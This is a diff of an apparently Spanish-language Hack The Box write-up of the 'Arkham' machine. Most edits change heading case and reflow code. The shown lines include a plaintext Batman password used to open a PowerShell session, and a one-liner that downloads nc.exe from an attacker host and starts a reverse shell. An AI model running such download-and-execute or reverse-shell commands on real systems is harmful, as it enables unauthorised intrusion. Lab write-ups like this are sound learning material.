@@ -2046,7 +2046,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 </div><h1 id="http---8080-">HTTP - 8080</h1>
 <p>Puerto 8080 en http.<br />
 <img src="/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-47-40.webp" alt="image" /></p>
-<h2 id="gobuster-">GOBUSTER</h2>
+<h2 id="gobuster-">Gobuster</h2>
 <p>Considerando que la pagina esta corrriendo en un apache myfaces (<code>web.xml.bak</code>), vamos a utilizar gobuster para buscar directorios y documentos.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.58.27.webp" alt="image" /></p>
 <p>Encontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico <code>/userSubscribe.faces</code> la cual no aparecio con gobuster.</p>
@@ -2240,7 +2240,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.15.01.webp" alt="image" /></p>
-<h1 id="reverse-shell---alfred-">REVERSE SHELL - Alfred</h1>
+<h1 id="shell---alfred-">Shell - Alfred</h1>
 <p>Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (<code>nc.exe</code>) y ejecutar una shell inversa.</p>
 <p><strong>Comando</strong>: Cambiamos el primer parametro de cmand a &ldquo;powershell&rdquo;.</p>
 <div class="highlight"><div class="chroma">
@@ -2254,12 +2254,12 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 </div><p>Obtenemos una shell inversa como Alfred y nuestra bandera <code>User.txt</code>.</p>
 <p><img src="/images/posts/htb/arkham/Peek%202019-04-17%2018-33.gif" alt="image" /></p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.35.33.webp" alt="image" /></p>
-<h3 id="usuarios---arkham-">USUARIOS - Arkham</h3>
+<h3 id="usuarios---arkham-">Usuarios - Arkham</h3>
 <p>Podemos ver que existen otros dos usuarios Batman y Administrator.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.57.42.webp" alt="image" /></p>
 <p>Vemos que Batman pertenece al grupo de Administrators.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.01.12.webp" alt="image" /></p>
-<h1 id="user---batman-">USER - BATMAN</h1>
+<h1 id="user---batman-">User - Batman</h1>
 <p>En el directorio <code>C:\Users\alfred\Downloads\backups</code> encontramos un archivo <code>backup.zip</code>, lo trasladamos a nuestra maquina con <a href="https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/"><strong>netcat</strong></a>.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.37.16.webp" alt="image" /></p>
 <p>Al descomprimirlo nos muestra un archivo <code>.ost</code> de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (<code>Drafts.mbox</code>).</p>
@@ -2288,28 +2288,42 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="p">=</span><span class="s2">&#34;ARKHAM\batman&#34;</span><span class="p">;</span><span class="nv">$password</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> <span class="n">-String</span> <span class="s2">&#34;Zx^#QZX+T!123&#34;</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">;</span> <span class="nb">New-PSSession</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="p">|</span> <span class="nb">Enter-PSSession</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="p">=</span><span class="s2">&#34;ARKHAM\batman&#34;</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> <span class="n">-String</span> <span class="s2">&#34;Zx^#QZX+T!123&#34;</span><span class="p">;</span> 
+<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">;</span> 
+<span class="nb">New-PSSession</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="p">|</span> <span class="nb">Enter-PSSession</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/htb/arkham/Peek%202019-04-17%2019-03.gif" alt="image" /></p>
 <p>Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.05.15.webp" alt="image" /></p>
-<h2 id="reverse-shell---batman-">REVERSE SHELL - BATMAN</h2>
+<h2 id="shell---batman-">Shell - Batman</h2>
 <p>Para obtener una shell inversa con el usuario Batman vamos a utilizar <code>Invoke-Command</code> para descargar netcat (<code>nc.exe</code>) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;ARKHAM\batman&#39;</span><span class="p">;</span><span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;Zx^#QZX+T!123&#39;</span><span class="p">;</span><span class="nv">$securePassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span><span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$securePassword</span><span class="p">;</span><span class="nb">Invoke-Command</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-ComputerName</span> <span class="n">ARKHAM</span> <span class="n">-Command</span> <span class="p">{</span><span class="n">powershell</span> <span class="nb">wget </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">2</span><span class="err">:</span><span class="n">8081</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Batman</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="p">;</span> <span class="n">powershell</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Batman</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">2</span> <span class="n">445</span><span class="p">}</span>
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="p">=</span> <span class="s1">&#39;ARKHAM\batman&#39;</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="p">=</span> <span class="s1">&#39;Zx^#QZX+T!123&#39;</span><span class="p">;</span>
+<span class="nv">$securePassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$password</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span>
+<span class="nv">$credential</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$securePassword</span><span class="p">;</span>
+<span class="nb">Invoke-Command</span> <span class="n">-Credential</span> <span class="nv">$credential</span> <span class="n">-ComputerName</span> <span class="n">ARKHAM</span> <span class="n">-Command</span> <span class="p">{</span><span class="n">powershell</span> <span class="nb">wget </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">2</span><span class="err">:</span><span class="n">8081</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Batman</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="p">;</span> <span class="n">powershell</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Batman</span><span class="p">\</span><span class="n">Documents</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">15</span><span class="p">.</span><span class="n">2</span> <span class="n">445</span><span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/htb/arkham/Peek%202019-04-18%2015-37.gif" alt="image" /></p>
 <p>Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.</p>
 <p><img src="/images/posts/htb/arkham/Screenshot%20from%202019-04-18%2015.39.02.webp" alt="image" /></p>
-<h1 id="root">ROOT</h1>
+<h1 id="root">Root</h1>
 <p>Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -3737,7 +3751,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     </li>
     <li><a href="#http---8080-">HTTP - 8080</a>
       <ul>
-        <li><a href="#gobuster-">GOBUSTER</a>
+        <li><a href="#gobuster-">Gobuster</a>
           <ul>
             <li><a href="#usersubscribefaces-">/userSubscribe.faces</a></li>
             <li><a href="#viewstate---arkham-">ViewState - Arkham</a></li>
@@ -3753,21 +3767,21 @@ var a = document.getElementsByClassName('navbar__menu-item')
         <li><a href="#rce---request-dns-">RCE - Request DNS</a></li>
       </ul>
     </li>
-    <li><a href="#reverse-shell---alfred-">REVERSE SHELL - Alfred</a>
+    <li><a href="#shell---alfred-">Shell - Alfred</a>
       <ul>
         <li>
           <ul>
-            <li><a href="#usuarios---arkham-">USUARIOS - Arkham</a></li>
+            <li><a href="#usuarios---arkham-">Usuarios - Arkham</a></li>
           </ul>
         </li>
       </ul>
     </li>
-    <li><a href="#user---batman-">USER - BATMAN</a>
+    <li><a href="#user---batman-">User - Batman</a>
       <ul>
-        <li><a href="#reverse-shell---batman-">REVERSE SHELL - BATMAN</a></li>
+        <li><a href="#shell---batman-">Shell - Batman</a></li>
       </ul>
     </li>
-    <li><a href="#root">ROOT</a></li>
+    <li><a href="#root">Root</a></li>
   </ul>
 </nav>          
         </div>
